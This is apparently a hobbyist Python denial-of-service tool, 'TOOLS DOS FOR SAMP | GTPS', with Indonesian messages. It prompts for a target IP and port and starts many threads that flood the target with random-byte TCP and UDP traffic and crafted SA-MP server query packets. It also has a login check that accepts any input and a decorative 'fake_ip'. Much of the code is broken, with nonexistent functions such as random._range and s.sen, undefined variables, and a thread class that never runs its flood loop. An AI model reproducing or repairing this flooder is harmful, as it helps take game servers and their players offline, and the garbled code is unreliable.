#AUTHOR : Fadil X TANGAN COLI
#SUBSCRIBE Fadil
import random
import threading
import codecs
import struct
import time
import socket
import sys
import os

username=('PlanetsRocky404')
password=('MeteorRocky404')
UserWarning= "\033[96mKamu Salah Memasukan Password"
usernameget=input('\033[94m🛸Enter The Username🛸:')
passwordget=input('\033[94m🛸Enter The Password🛸: ')
print("\033[96mKamu Berhasil Memasukan Password")

os.system("clear")
print("\033[31mTOOLS DOS FOR SAMP | GTPS")
print("""\033[31m

██████╗░░█████╗░░█████╗░██╗░░██╗██╗░░░██╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝╚██╗░██╔╝
██████╔╝██║░░██║██║░░╚═╝█████═╝░░╚████╔╝░
██╔══██╗██║░░██║██║░░██╗██╔═██╗░░░╚██╔╝░░
██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗░░░██║░░░
╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░""")
print("""
\033[0;36m                      
\033[0;36m               
\033[0;36m               
\033[0;36m               
\033[0;36m               
\033[0;36m               
\033[0;36m               
\033[0;36m               
\033[0;36m                
TOOLS PlanetsRocky404/MeteorRocky404""")
print("\033[31m━━━ Enter The Ready Attack (y/n)")
choice = str(input("┗━>\033[96m:"))
print("[0] Loading.......")
time.sleep(1)
print("[25] Loading......")
time.sleep(1)
print("[69] Loading.......")
time.sleep(1)
print("[100] Loading.......")
time.sleep(1)
print("""
\033[0;31m                 ██████ ▓██   ██▓ ███▄    █ ▄▄▄█████▓ ▄▄▄     ▒██   ██▒
\033[0;32m               ▒██    ▒  ▒██  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▒████▄   ▒▒ █ █ ▒░
\033[0;33m               ░ ▓██▄     ▒██ ██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒██  ▀█▄ ░░  █   ░
\033[0;34m                 ▒   ██▒  ░ ▐██▓░▓██▒  ▐▌██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░ █ █ ▒ 
\033[0;35m               ▒██████▒▒  ░ ██▒▓░▒██░   ▓██░  ▒██▒ ░  ▓█   ▓██▒██▒ ▒██▒
\033[0;36m               ▒ ▒▓▒ ▒ ░   ██▒▒▒ ░ ▒░   ▒ ▒   ▒ ░░    ▒▒   ▓▒█▒▒ ░ ░▓ ░
\033[0;37m               ░ ░▒  ░   ▓██ ░▒░ ░ ░░   ░ ▒░    ░      ░   ▒▒ ░░   ░▒ ░
\033[0;38m               ░  ░  ░   ▒ ▒ ░░     ░   ░ ░   ░ ░      ░   ▒   ░    ░  
\033[0;39m                     ░   ░ ░              ░                ░   ░    ░ 
""")

ip = str(input("\033[0;91mEnter The Target Ip:"))
port = int(input("\033[0;92mEnter The Target Port:"))
choice = str(input("\033[0;91mEnter The Ready Attack [Y] (y/n):"))
times = int(input("\033[0;92mEnter The Attack Packet:"))
threads = int(input("\033[0;91mEnter The Attack Threads:"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def xxxxxxxxx():
  data = random._urandom(881)
  times = random._range(35534)
  threads = random._range(35534)
  data = random._urandom(881)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  times = random._range(35534)
  threads = random._range(35534)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(data,addr)
        print(i +" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))

def xxxxxxxx():
  data = random._urandom(881)
  times = random._range(35534)
  threads = random._range(35534)
  data = random._urandom(881)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(data,addr)
        print(i +" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))

def xxxxxxx():
  data = random._urandom(881)
  times = random._range(35534)
  threads = random._range(35534)
  data = random._urandom(881)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.send(data,addr)
        print(i +" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))

def xxxxxx():
  data = random._urandom(881)
  times = random._range(35534)
  threads = random._range(35534)
  data = random._urandom(881)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(data,addr)
        print(i +" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))

def xxxxx():
  data = random._urandom(881)
  times = random._range(35534)
  threads = random._range(35534)
  data = random._urandom(881)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))

def xxxx():
  data = random._urandom(881)
  times = random._range(35534)
  threads = random._range(35534)
  data = random._urandom(881)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))

def xxx():
  data = random._urandom(991)
  times = random._range(35534)
  threads = random._range(35534)
  data = random._urandom(881)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(data,addr)
        print(i +" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))

def xx():
  data = random._urandom(991)
  times = random._range(35534)
  threads = random._range(35534)
  data = random._urandom(881)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))

def x():
  data = random._urandom(991)
  times = random._range(35534)
  threads = random._range(35534)
  data = random._urandom(9911)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  L_bytes = random._range(35534)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[96m====>>Attacking Server: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))

for y in range(threads):

    th = threading.Thread(target = xxxxxxxxx)
    th.start()
    th = threading.Thread(target = xxxxxxxx)
    th.start()
    th = threading.Thread(target = xxxxxxx)
    th.start()
    th = threading.Thread(target = xxxxxx)
    th.start()
    th = threading.Thread(target = xxxxx)
    th.start()
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
else:
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()


def DDOS():
	data = random._urandom(1460)
	data = random._range(9911)
	times = random._range(35534)
	threads = random._range(35534)
	L_bytes = random._range,(35534)
	I_bytes = random._range(35534)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[96m====>>>Send to attacking packet: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[96m====>>>Downed Attack Server Hosted: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))

def DDOS2():
	data = random._urandom(1204)
	times = random._range(35534)
	threads = random._range(35534)
	L_bytes = random._range,(35534)
	I_bytes = random._range(35534)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[96m====>>>Send to attacking packet: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[96m====>>>Downed Attack Server Hosted: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
            

def DDOS3():
	data = random._urandom(999)
	times = random._range(35534)
	threads = random._range(35534)
	L_bytes = random._range,(35534)
	I_bytes = random._range(35534)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[96m====>>>Send to attacking packet: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[96m====>>>Downed Attack Server Hosted: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
            
  
def DDOS4():
	data = random._urandom(818)
	range = random._range(577)
	times = random._range(35534)
	threads = random._range(35534)
	L_bytes = random._range,(35534)
	I_bytes = random._range(35534)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[96m====>>>Send to attacking packet: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[96m====>>>Downed Attack Server Hosted: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
			
def DDOS5():
	data = random._urandom(47569)
	times = random._range(35534)
	threads = random._range(35534)
	L_bytes = random._range,(35534)
	I_bytes = random._range(35534)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[96m====>>>Send to attacking packet: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[96m====>>>Downed Attack Server Hosted: %s \033[96mAnd Attack Port:%s!!!"%(ip,port))
            
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def DDOS(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = DDOS)
		th.start()
		th = threading.Thread(target = DDOS2)
		th.start()
		th = threading.Thread(target = DDOS3)
		th.start()
		th = threading.Thread(target = DDOS4)
		th.start()
else:
		th = threading.Thread(target = DDOS5)
		th.start()
		
